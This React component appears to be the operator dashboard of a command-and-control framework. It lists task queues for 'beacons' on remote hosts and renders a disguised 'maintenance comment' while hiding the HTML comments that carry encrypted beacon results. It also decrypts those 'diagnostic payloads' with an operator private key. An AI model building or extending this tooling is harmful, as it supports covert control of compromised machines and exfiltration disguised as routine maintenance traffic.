// dashboard/src/components/MaintenancePanel.tsx
import React, { useState, useEffect } from 'react';
import { useQuery, useQueryClient } from '@tanstack/react-query';
import { useAuth } from '@/context/AuthContext';
import { C2ServerClient } from '@/lib/C2ServerClient';
import type { MaintenanceTaskSummary, SSEEvent } from '@/lib/C2ServerClient';
import { parseMaintenanceDiagnosticPayload, decryptSealedResult } from '@/lib/crypto';

// ── Helpers ───────────────────────────────────────────────────────────────────

function rel(iso: string | null): string {
  if (!iso) return '—';
  const ms = Date.now() - new Date(iso).getTime();
  if (ms < 60_000)     return 'just now';
  if (ms < 3_600_000)  return `${Math.floor(ms / 60_000)}m ago`;
  if (ms < 86_400_000) return `${Math.floor(ms / 3_600_000)}h ago`;
  return `${Math.floor(ms / 86_400_000)}d ago`;
}

const STATUS_COLOURS: Record<string, string> = {
  pending:   'text-gray-400 border-gray-700',
  delivered: 'text-blue-400 border-blue-800',
  completed: 'text-green-400 border-green-800',
  failed:    'text-red-400 border-red-800',
};

// ── Markdown renderer ─────────────────────────────────────────────────────────

export function renderMaintenanceMarkdown(body: string): React.ReactElement {
  const lines = body.split('\n');
  const elements: React.ReactElement[] = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i]!; // Safe non-null assertion: we're within bounds

    // Skip all HTML comments (includes the infra-diagnostic marker with embedded ciphertext)
    if (line.startsWith('<!-- ')) {
      i++;
      continue;
    }

    // h3
    if (line.startsWith('### ')) {
      elements.push(
        <h3 key={i} className="text-xs text-gray-400 uppercase tracking-widest font-mono mt-3 mb-1">
          {line.slice(4)}
        </h3>
      );
      i++;
      continue;
    }

    // h4
    if (line.startsWith('#### ')) {
      elements.push(
        <h4 key={i} className="text-[10px] text-gray-600 uppercase tracking-widest font-mono mt-2 mb-0.5">
          {line.slice(5)}
        </h4>
      );
      i++;
      continue;
    }

    // Checked task: - [x] **ref** — label
    const checkedMatch = line.match(/^- \[x\] \*\*(.+?)\*\* — (.+)$/);
    if (checkedMatch) {
      elements.push(
        <div key={i} className="text-xs font-mono text-green-400">
          {'■ '}{checkedMatch[1]}{' — '}{checkedMatch[2]}
        </div>
      );
      i++;
      continue;
    }

    // Unchecked task: - [ ] **ref** — label
    const uncheckedMatch = line.match(/^- \[ \] \*\*(.+?)\*\* — (.+)$/);
    if (uncheckedMatch) {
      elements.push(
        <div key={i} className="text-xs font-mono text-gray-500">
          {'□ '}{uncheckedMatch[1]}{' — '}{uncheckedMatch[2]}
        </div>
      );
      i++;
      continue;
    }

    // <details> block — collect until </details>
    if (line.trim() === '<details>') {
      const detailsLines: string[] = [];
      let summaryText = '';
      i++;
      // parse <summary>...</summary>
      if (i < lines.length) {
        const summaryLine = lines[i]!;
        if (summaryLine.trim().startsWith('<summary>')) {
          const summaryMatch = summaryLine.match(/<summary>(.*?)<\/summary>/);
          summaryText = summaryMatch?.[1] ?? '';
          i++;
        }
      }
      // collect body until </details>
      while (i < lines.length) {
        const detailLine = lines[i]!;
        if (detailLine.trim() === '</details>') break;
        detailsLines.push(detailLine);
        i++;
      }
      // skip </details>
      if (i < lines.length) i++;

      // render inner content of details block
      const innerElements = renderMaintenanceMarkdown(detailsLines.join('\n'));

      elements.push(
        <details
          key={i}
          className="my-1 border border-octo-border/40 rounded bg-octo-black/60"
        >
          <summary className="px-2 py-1 text-[10px] text-gray-500 font-mono cursor-pointer select-none">
            {summaryText}
          </summary>
          <div className="px-2 pb-2">
            {innerElements}
          </div>
        </details>
      );
      continue;
    }

    // Skip </details> orphans
    if (line.trim() === '</details>') {
      i++;
      continue;
    }

    // Code fence start: ```text
    if (line.trim() === '```text' || line.trim() === '```') {
      // check if this is an opening fence
      const isOpen = line.trim() === '```text';
      if (isOpen) {
        const codeLines: string[] = [];
        i++;
        while (i < lines.length) {
          const codeLine = lines[i]!;
          if (codeLine.trim() === '```') break;
          codeLines.push(codeLine);
          i++;
        }
        // skip closing ```
        if (i < lines.length) i++;
        elements.push(
          <pre
            key={i}
            className="bg-octo-black border border-octo-border rounded p-2 text-[10px] text-gray-500 font-mono overflow-x-auto max-h-32 overflow-y-auto"
          >
            {codeLines.join('\n')}
          </pre>
        );
        continue;
      }
      // closing ``` without matching open — skip
      i++;
      continue;
    }

    // Empty lines — skip
    if (line.trim() === '') {
      i++;
      continue;
    }

    // ✅ / ❌ status lines — render with appropriate colour
    if (line.startsWith('✅')) {
      elements.push(
        <p key={i} className="text-xs text-green-400 font-mono">{line}</p>
      );
      i++;
      continue;
    }
    if (line.startsWith('❌')) {
      elements.push(
        <p key={i} className="text-xs text-red-400 font-mono">{line}</p>
      );
      i++;
      continue;
    }

    // Default paragraph
    elements.push(
      <p key={i} className="text-xs text-gray-600 font-mono">{line}</p>
    );
    i++;
  }

  return <>{elements}</>;
}

// ── JSON syntax highlighting ──────────────────────────────────────────────────

function tokenizeJson(json: string): Array<{ text: string; cls: string }> {
  const TOKEN_RE = /("(?:[^"\\]|\\.)*")(\s*:)?|(-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)|(\btrue\b|\bfalse\b|\bnull\b)|([{}\[\],:])|(\s+)/g;
  const out: Array<{ text: string; cls: string }> = [];
  let last = 0;
  let m: RegExpExecArray | null;
  while ((m = TOKEN_RE.exec(json)) !== null) {
    if (m.index > last) {
      out.push({ text: json.slice(last, m.index), cls: 'text-gray-600' });
    }
    if (m[1] !== undefined && m[2] !== undefined) {
      // key: "word":
      out.push({ text: m[1], cls: 'text-[#00f0ff]' });
      out.push({ text: m[2], cls: 'text-gray-500' });
    } else if (m[1] !== undefined) {
      // string value
      out.push({ text: m[1], cls: 'text-green-300' });
    } else if (m[3] !== undefined) {
      // number
      out.push({ text: m[3], cls: 'text-orange-300' });
    } else if (m[4] !== undefined) {
      // boolean/null
      out.push({ text: m[4], cls: 'text-orange-400' });
    } else if (m[5] !== undefined) {
      // punctuation
      out.push({ text: m[5], cls: 'text-gray-600' });
    } else if (m[6] !== undefined) {
      // whitespace
      out.push({ text: m[6], cls: '' });
    }
    last = TOKEN_RE.lastIndex;
  }
  if (last < json.length) {
    out.push({ text: json.slice(last), cls: 'text-gray-600' });
  }
  return out;
}

function SyntaxHighlightedJson({ json }: { json: string }): React.ReactElement {
  const tokens = tokenizeJson(json);
  return (
    <code>
      {tokens.map((tok, i) => (
        <span key={i} className={tok.cls}>{tok.text}</span>
      ))}
    </code>
  );
}

// ── Copy button ───────────────────────────────────────────────────────────────

function CopyButton({ text }: { text: string }): React.ReactElement {
  const [copied, setCopied] = useState(false);

  function handleCopy() {
    void navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }

  return (
    <button
      onClick={handleCopy}
      aria-label="Copy JSON"
      className="text-[10px] px-2 py-0.5 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
    >
      {copied ? 'Copied!' : 'Copy JSON'}
    </button>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function TaskRow({ task }: { task: MaintenanceTaskSummary }) {
  return (
    <div className="border-b border-octo-border/40 py-1.5 px-3 flex items-center gap-3 text-xs font-mono">
      <span className={`text-[9px] border px-1.5 py-0.5 rounded shrink-0 ${STATUS_COLOURS[task.status] ?? 'text-gray-500 border-gray-800'}`}>
        {task.status}
      </span>
      <span className="text-gray-400 w-20 shrink-0 truncate">{task.kind}</span>
      <span className="text-gray-600 text-[10px] shrink-0">{task.ref}</span>
      <span className="ml-auto text-[10px] text-gray-700 shrink-0">{rel(task.createdAt)}</span>
    </div>
  );
}

// ── MaintenancePanel ──────────────────────────────────────────────────────────

export function MaintenancePanel({ beaconId }: { beaconId: string }) {
  const { pat, mode, serverUrl, privkey } = useAuth();
  const queryClient = useQueryClient();

  const { data: maint, isLoading } = useQuery({
    queryKey:        ['maintenance', beaconId, serverUrl, pat],
    queryFn:         () => new C2ServerClient(serverUrl, pat).getMaintenance(beaconId),
    enabled:         mode === 'live' && pat.length > 0,
    refetchInterval: 30_000,
    staleTime:       10_000,
  });

  const { data: commentData } = useQuery({
    queryKey:        ['maintenance-comment', beaconId, serverUrl, pat],
    queryFn:         () => new C2ServerClient(serverUrl, pat).getMaintenanceComment(beaconId),
    enabled:         mode === 'live' && pat.length > 0,
    refetchInterval: 60_000,
  });

  const commentBody = commentData?.commentBody ?? null;
  const diagPayload = parseMaintenanceDiagnosticPayload(commentBody ?? null);

  const [diagDecrypted, setDiagDecrypted] = useState<string | null>(null);
  const [diagError, setDiagError]         = useState<string | null>(null);
  const [keyInput, setKeyInput]           = useState('');

  useEffect(() => {
    if (privkey && diagPayload && diagDecrypted === null && diagError === null) {
      decryptSealedResult(diagPayload, privkey)
        .then(plain => setDiagDecrypted(plain))
        .catch(() => setDiagError('Decryption failed — check private key'));
    }
  }, [privkey, diagPayload]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── SSE invalidation ──────────────────────────────────────────────────────

  useEffect(() => {
    if (mode !== 'live') return;
    const ctrl = new AbortController();
    void new C2ServerClient(serverUrl, pat).subscribeEvents((event: SSEEvent) => {
      if (
        event.type === 'beacon-update' ||
        (event.type === 'maintenance-update' && event.beaconId === beaconId)
      ) {
        void queryClient.invalidateQueries({ queryKey: ['maintenance', beaconId, serverUrl, pat] });
        void queryClient.invalidateQueries({ queryKey: ['maintenance-comment', beaconId, serverUrl, pat] });
      }
    }, ctrl.signal);
    return () => ctrl.abort();
  }, [mode, serverUrl, pat, beaconId, queryClient]);

  async function doDecryptDiag(key: string) {
    try {
      const plain = await decryptSealedResult(diagPayload!, key);
      setDiagDecrypted(plain);
      setDiagError(null);
    } catch {
      setDiagError('Decryption failed — check private key');
    }
  }

  if (mode !== 'live') {
    return (
      <div className="p-4">
        <p className="text-xs text-gray-600 font-mono">Live mode required for maintenance data</p>
      </div>
    );
  }

  if (isLoading || !maint) {
    return <p className="text-xs text-gray-600 p-4 font-mono">Loading…</p>;
  }

  return (
    <div className="space-y-0">
      {/* Header */}
      <div className="px-3 py-2 border-b border-octo-border/40 flex items-center gap-3 text-xs font-mono">
        <span className="text-gray-200">{maint.hostname}</span>
        <span className="text-gray-600">{maint.os}/{maint.arch}</span>
        <span className="ml-auto text-[10px] text-gray-700">{rel(maint.lastSeen)}</span>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-4 border-b border-octo-border/40">
        {[
          { label: 'Queued',    value: maint.pendingCount,   colour: 'text-octo-blue' },
          { label: 'Completed', value: maint.completedCount, colour: 'text-green-400' },
          { label: 'Failed',    value: maint.failedCount,    colour: 'text-red-400' },
          { label: 'Total',     value: maint.taskCount,      colour: 'text-gray-300' },
        ].map(({ label, value, colour }) => (
          <div key={label} className="flex flex-col items-center py-3 border-r border-octo-border/40 last:border-r-0">
            <span className={`text-lg font-mono font-bold ${colour}`}>{value}</span>
            <span className="text-[9px] text-gray-700 uppercase tracking-widest">{label}</span>
          </div>
        ))}
      </div>

      {/* Section heading */}
      <div className="px-3 py-1.5 border-b border-octo-border/40">
        <span className="text-[9px] text-gray-600 uppercase tracking-widest">Task Queue</span>
      </div>

      {/* Task rows */}
      {maint.tasks.length === 0 ? (
        <p className="text-xs text-gray-700 p-4 font-mono">No tasks yet.</p>
      ) : (
        maint.tasks.map(task => <TaskRow key={task.taskId} task={task} />)
      )}

      {/* Comment Preview section */}
      <div className="px-3 py-1.5 border-t border-octo-border/40">
        <span className="text-[9px] text-gray-600 uppercase tracking-widest">Comment Preview</span>
      </div>

      <div className="px-3 py-2">
        {commentBody == null ? (
          <p className="text-gray-600 font-mono text-xs">No maintenance comment found</p>
        ) : (
          renderMaintenanceMarkdown(commentBody)
        )}
      </div>

      {diagPayload && (
        <div className="px-3 py-2 border-t border-octo-border/40">
          <p className="text-[9px] text-gray-600 uppercase tracking-widest mb-2">Diagnostic Payload</p>
          {diagDecrypted !== null ? (
            <div className="space-y-1">
              <div className="flex justify-end">
                <CopyButton text={(() => {
                  try { return JSON.stringify(JSON.parse(diagDecrypted), null, 2); }
                  catch { return diagDecrypted; }
                })()} />
              </div>
              <pre className="bg-octo-black border border-green-900 rounded p-2 text-[11px] font-mono whitespace-pre-wrap overflow-auto max-h-48">
                <SyntaxHighlightedJson json={(() => {
                  try { return JSON.stringify(JSON.parse(diagDecrypted), null, 2); }
                  catch { return diagDecrypted; }
                })()} />
              </pre>
            </div>
          ) : diagError !== null ? (
            <div className="space-y-1">
              <p className="text-[10px] text-red-400 font-mono">{diagError}</p>
              <div className="flex gap-2">
                <input
                  type="password"
                  value={keyInput}
                  onChange={e => setKeyInput(e.target.value)}
                  placeholder="Private key (base64url)"
                  className="flex-1 bg-octo-black border border-octo-border rounded px-2 py-1 text-xs font-mono outline-none focus:border-octo-blue/50"
                />
                <button
                  onClick={() => void doDecryptDiag(keyInput)}
                  className="text-[10px] px-3 py-1 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
                >
                  Retry
                </button>
              </div>
            </div>
          ) : privkey ? (
            <p className="text-[10px] text-gray-600 font-mono">Decrypting…</p>
          ) : (
            <div className="space-y-1">
              <p className="text-[10px] text-gray-600 font-mono">Encrypted diagnostic — enter operator private key</p>
              <div className="flex gap-2">
                <input
                  type="password"
                  value={keyInput}
                  onChange={e => setKeyInput(e.target.value)}
                  placeholder="Private key (base64url)"
                  className="flex-1 bg-octo-black border border-octo-border rounded px-2 py-1 text-xs font-mono outline-none focus:border-octo-blue/50"
                />
                <button
                  onClick={() => void doDecryptDiag(keyInput)}
                  className="text-[10px] px-3 py-1 bg-octo-blue/10 border border-octo-blue/30 text-octo-blue rounded hover:bg-octo-blue/20 font-mono"
                >
                  Decrypt
                </button>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
